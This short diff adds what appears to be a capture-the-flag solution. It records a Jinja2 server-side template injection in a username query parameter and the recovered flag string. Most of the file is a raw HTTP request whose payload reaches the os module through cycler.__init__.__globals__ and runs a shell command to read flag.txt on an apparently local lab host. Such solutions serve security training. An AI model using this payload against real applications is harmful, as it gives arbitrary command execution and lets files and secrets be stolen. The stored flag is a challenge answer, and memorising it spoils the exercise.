@@ -1,0 +1,4 @@
+# Jinja2 SSTI via username query param. cycler.__init__.__globals__.os gives RCE. Reads flag.txt from app root. Flag: flag{e7f1e7e4-3abe-4643-9d9e-e64a767bca8b}
+
+GET /?username={{cycler.__init__.__globals__.os.popen('cat flag.txt').read()}} HTTP/1.1
+Host: 172.17.0.1:35363
